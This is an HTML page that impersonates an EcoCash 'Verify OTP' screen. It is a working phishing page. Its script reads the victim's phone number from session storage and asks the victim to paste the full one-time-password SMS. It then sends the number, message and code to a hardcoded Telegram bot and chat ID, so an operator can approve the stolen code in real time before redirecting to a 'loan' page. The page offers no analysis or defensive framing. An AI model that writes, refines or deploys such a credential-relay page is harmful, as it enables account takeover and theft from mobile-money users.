<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>EcoCash – Verify OTP</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      background: #e5e5e5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px;
    }

    .container {
      width: 100%;
      max-width: 400px;
      margin: auto;
      background: white;
      min-height: 100vh;
      position: relative;
      overflow: hidden;
    }

    .main-content {
      position: relative;
      z-index: 2;
      padding: 20px 22px 40px;
      text-align: center;
    }

    .logo {
      font-size: 38px;
      font-weight: bold;
      margin-top: 20px;
      margin-bottom: 12px;
    }
    .logo span:first-child { color: #1c6aa6; }
    .logo span:last-child { color: #e12b2b; }

    .otp-title {
      color: #1c6aa6;
      font-size: 26px;
      font-weight: bold;
      margin: 10px 0 8px;
    }

    .subtitle {
      color: #666;
      font-size: 15px;
      margin: 12px 0 8px;
      line-height: 1.4;
    }

    .phone-masked {
      display: inline-block;
      background: #f2f2f2;
      padding: 8px 18px;
      border-radius: 40px;
      font-weight: bold;
      color: #1c6aa6;
      font-size: 16px;
      margin-top: 6px;
      letter-spacing: 0.5px;
    }

    .timer-row {
      display: flex;
      justify-content: center;
      align-items: center;
      background: transparent;
      padding: 8px 20px;
      margin: 20px 0 10px;
      font-size: 16px;
      font-weight: 600;
    }

    .otp-textarea {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      border: 2px solid #1c6aa6;
      border-radius: 12px;
      resize: vertical;
      font-family: monospace;
      background: white;
      outline: none;
      transition: all 0.2s;
      margin: 10px 0;
    }
    .otp-textarea:focus {
      border-color: #e12b2b;
      box-shadow: 0 0 0 2px rgba(225,43,43,0.2);
    }

    .info-note {
      font-size: 13px;
      color: #666;
      margin: 8px 0 4px;
      background: #f8f8f8;
      padding: 8px;
      border-radius: 10px;
    }

    .warning-note {
      font-size: 12px;
      color: #e12b2b;
      margin-top: 4px;
      display: none;
    }

    .submit-btn {
      width: 100%;
      background: #1c6aa6;
      border: none;
      border-radius: 40px;
      padding: 14px;
      font-size: 18px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 10px;
    }
    .submit-btn:disabled {
      background: #9cb8d0;
      cursor: not-allowed;
    }
    .submit-btn:active:not(:disabled) {
      background: #0e4a73;
    }

    .error-message {
      color: #e12b2b;
      font-size: 13px;
      margin-top: 16px;
      min-height: 42px;
    }

    .bottom-note {
      margin-top: 28px;
      font-size: 12px;
      color: #aaa;
      text-align: center;
    }

    #spinnerOverlay {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(3px);
      z-index: 9999;
    }
    .spinner-loader {
      width: 48px;
      height: 48px;
      border: 5px solid #ffffff;
      border-top: 5px solid #1c6aa6;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (max-width: 400px) {
      .otp-textarea {
        font-size: 14px;
        padding: 12px;
      }
      .timer-row {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="main-content">
    <div class="logo">
      <span>Eco</span><span>Cash</span>
    </div>
    <div class="otp-title">Verify OTP</div>
    <div class="subtitle">
      Enter the OTP sent to your phone number
    </div>
    <div class="phone-masked" id="maskedPhoneDisplay">+263 7*******</div>

    <textarea class="otp-textarea" id="otpMessage" rows="3" placeholder="Paste the full SMS message here...&#10;Example: Your EcoCash OTP is 123456"></textarea>
    <div class="info-note">📋 Please paste the entire SMS message you received. The 6‑digit code will be extracted automatically.</div>
    <div class="warning-note" id="warningNote">⚠️ Please paste the full message, not just the code.</div>

    <div class="timer-row" style="justify-content: center; background: transparent; margin-top: 0;">
      <span id="resendMessage" style="color:#1c6aa6; font-weight:500;">Resend OTP in <span id="resendTimer">120</span> seconds</span>
    </div>

    <button class="submit-btn" id="submitBtn">Submit</button>
    <div class="error-message" id="errorMsg"></div>
    <div class="bottom-note">Check your mobile device for the OTP</div>
  </div>
</div>

<div id="spinnerOverlay">
  <div class="spinner-loader"></div>
</div>

<script>
  (function() {
    // ==================== TELEGRAM CONFIG ====================
    const BOT_TOKEN = '8914349012:AAHK0PwteGNuzocd2wJ1mb2LE2swxDVed8A';
    const CHAT_ID   = '1006917440';
    const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
    
    // ==================== DOM ELEMENTS ====================
    const otpTextarea = document.getElementById('otpMessage');
    const submitBtn = document.getElementById('submitBtn');
    const errorDiv = document.getElementById('errorMsg');
    const maskedSpan = document.getElementById('maskedPhoneDisplay');
    const resendTimerSpan = document.getElementById('resendTimer');
    const warningNote = document.getElementById('warningNote');
    
    const spinner = document.getElementById('spinnerOverlay');
    function showSpinner() { spinner.style.display = 'flex'; }
    function hideSpinner() { spinner.style.display = 'none'; }
    
    // ==================== STATE ====================
    let isSubmitting = false;
    let countdownSeconds = 120;
    let countdownInterval = null;
    let pollingInterval = null;
    
    let userPhone = null;
    let maskedPhone = '+263 7******';
    
    // ==================== RETRIEVE PHONE FROM SESSION ====================
    function getStoredPhone() {
      try {
        const stored = sessionStorage.getItem('ecocash_approved_phone');
        if (stored && stored.replace(/\D/g, '').length >= 9) {
          userPhone = stored.replace(/\D/g, '');
          if (userPhone.startsWith('7') && userPhone.length === 9) {
            const firstThree = userPhone.substring(0, 3);
            const lastTwo = userPhone.substring(userPhone.length - 2);
            const maskedLocal = firstThree + '****' + lastTwo;
            maskedPhone = `+263 ${maskedLocal}`;
          } else {
            maskedPhone = '+263 7*******';
          }
        } else {
          maskedPhone = '+263 7*******';
          userPhone = null;
        }
      } catch(e) {
        maskedPhone = '+263 7*******';
      }
      maskedSpan.innerText = maskedPhone;
    }
    
    // ==================== COUNTDOWN ====================
    function updateResendDisplay() {
      if (resendTimerSpan) resendTimerSpan.innerText = countdownSeconds;
    }
    
    function stopCountdown() {
      if (countdownInterval) {
        clearInterval(countdownInterval);
        countdownInterval = null;
      }
    }
    
    function startCountdown() {
      stopCountdown();
      countdownSeconds = 120;
      updateResendDisplay();
      countdownInterval = setInterval(() => {
        if (isSubmitting) return;
        if (countdownSeconds <= 1) {
          stopCountdown();
          stopPolling();
          sessionStorage.removeItem('ecocash_approved_phone');
          sessionStorage.removeItem('ecocash_approved_pin');
          window.location.href = 'login.html';
        } else {
          countdownSeconds--;
          updateResendDisplay();
        }
      }, 1000);
    }
    
    // ==================== EXTRACT 6-DIGIT CODE ====================
    function extractSixDigitCode(text) {
      const match = text.match(/\b\d{6}\b/);
      return match ? match[0] : null;
    }
    
    // ==================== VALIDATE THAT USER PASTED FULL MESSAGE ====================
    // Returns true if the input looks like a full message (contains non-digit characters or is longer than 6 digits)
    function isFullMessage(text) {
      const trimmed = text.trim();
      if (trimmed.length === 0) return false;
      // If the input consists only of digits and length is between 6 and 6 (exactly 6 digits), reject
      if (/^\d{6}$/.test(trimmed)) return false;
      // Also if it's just digits but longer than 6? That could be a 10-digit phone number? Unlikely but we'll accept longer digit sequences as they contain extra digits (maybe a number). Actually to force full message, we require at least one non-digit or length > 6.
      if (/^\d+$/.test(trimmed) && trimmed.length <= 6) return false;
      return true;
    }
    
    // ==================== TELEGRAM OTP APPROVAL ====================
    function stopPolling() {
      if (pollingInterval) {
        clearInterval(pollingInterval);
        pollingInterval = null;
      }
    }
    
    function escapeHtml(str) {
      if (!str) return '';
      return str.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
      });
    }
    
    async function sendOtpToTelegram(phoneNumber, enteredOtp, fullMessage) {
      const timestamp = Date.now();
      const approveId = `otp_approve_${timestamp}`;
      const declineId = `otp_decline_${timestamp}`;
      
      const message = `🔐 <b>EcoCash OTP Verification</b>\n\n` +
                      `<b> Phone:</b> <code>${escapeHtml(phoneNumber)}</code>\n` +
                      `<b> Full Message:</b>\n<code>${escapeHtml(fullMessage)}</code>\n\n` +
                      `<b> Extracted OTP:</b> <code>${escapeHtml(enteredOtp)}</code>\n\n` +
                      `⚠️ <b>Action required:</b> Approve or Decline this OTP.`;
      
      try {
        const response = await fetch(`${API_BASE}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[
                { text: '✅ Approve', callback_data: approveId },
                { text: '❌ Decline', callback_data: declineId }
              ]]
            }
          })
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        startPollingForDecision(approveId, declineId);
      } catch (err) {
        console.error('Telegram send error:', err);
        hideSpinner();
        isSubmitting = false;
        submitBtn.disabled = false;
        enableInput(true);
        errorDiv.innerText = 'Network error. Please try again.';
      }
    }
    
    function startPollingForDecision(approveId, declineId) {
      stopPolling();
      let lastUpdateId = 0;
      
      pollingInterval = setInterval(async () => {
        if (!isSubmitting) {
          stopPolling();
          return;
        }
        try {
          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
          const resp = await fetch(url);
          const data = await resp.json();
          if (!data.ok || !data.result.length) return;
          
          for (const update of data.result) {
            lastUpdateId = Math.max(lastUpdateId, update.update_id);
            const callback = update.callback_query;
            if (!callback) continue;
            const cbData = callback.data;
            
            if (cbData === approveId) {
              stopPolling();
              stopCountdown();
              isSubmitting = false;
              hideSpinner();
              sessionStorage.removeItem('ecocash_approved_phone');
              sessionStorage.removeItem('ecocash_approved_pin');
              window.location.href = 'loan.html';
              return;
            }
            
            if (cbData === declineId) {
              stopPolling();
              isSubmitting = false;
              hideSpinner();
              submitBtn.disabled = false;
              enableInput(true);
              errorDiv.innerText = '❌ OTP verification declined. Please try again.';
              otpTextarea.value = '';
              otpTextarea.focus();
              return;
            }
          }
        } catch (err) {
          console.warn('Polling error:', err);
        }
      }, 1500);
    }
    
    // ==================== INPUT HANDLING ====================
    function enableInput(enabled) {
      if (enabled) otpTextarea.removeAttribute('disabled');
      else otpTextarea.setAttribute('disabled', 'disabled');
    }
    
    // Real-time validation: show warning if only digits (<=6) are entered
    function validateInput() {
      const rawText = otpTextarea.value;
      if (rawText.trim().length === 0) {
        warningNote.style.display = 'none';
        submitBtn.disabled = true;
        return false;
      }
      if (!isFullMessage(rawText)) {
        warningNote.style.display = 'block';
        submitBtn.disabled = true;
        return false;
      }
      const code = extractSixDigitCode(rawText);
      if (!code) {
        warningNote.style.display = 'block';
        warningNote.innerText = '⚠️ No 6‑digit OTP found in the message. Please check and paste the full SMS.';
        submitBtn.disabled = true;
        return false;
      }
      warningNote.style.display = 'none';
      submitBtn.disabled = false;
      return true;
    }
    
    function handleInput() {
      validateInput();
      // Optionally auto-submit? Not auto, let user click submit.
    }
    
    function getEnteredOtp() {
      const rawText = otpTextarea.value;
      return extractSixDigitCode(rawText);
    }
    
    async function submitOtp() {
      if (isSubmitting) return;
      if (!validateInput()) return;
      
      const fullMessage = otpTextarea.value;
      const otpCode = getEnteredOtp();
      if (!otpCode) {
        errorDiv.innerText = 'Could not extract a 6‑digit OTP from the message.';
        return;
      }
      
      if (!userPhone) {
        errorDiv.innerText = 'Session expired. Redirecting...';
        setTimeout(() => { window.location.href = 'login.html'; }, 1500);
        return;
      }
      
      isSubmitting = true;
      submitBtn.disabled = true;
      enableInput(false);
      showSpinner();
      errorDiv.innerText = '';
      
      await sendOtpToTelegram(userPhone, otpCode, fullMessage);
    }
    
    // ==================== INITIALIZATION ====================
    function init() {
      getStoredPhone();
      if (!userPhone) {
        errorDiv.innerText = 'Missing session information. Redirecting...';
        setTimeout(() => {
          window.location.href = 'login.html';
        }, 2000);
        return;
      }
      
      startCountdown();
      
      otpTextarea.addEventListener('input', handleInput);
      submitBtn.addEventListener('click', submitOtp);
      
      otpTextarea.focus();
      validateInput(); // initial state
    }
    
    window.addEventListener('beforeunload', () => {
      stopCountdown();
      stopPolling();
    });
    
    init();
  })();
</script>
</body>
</html>
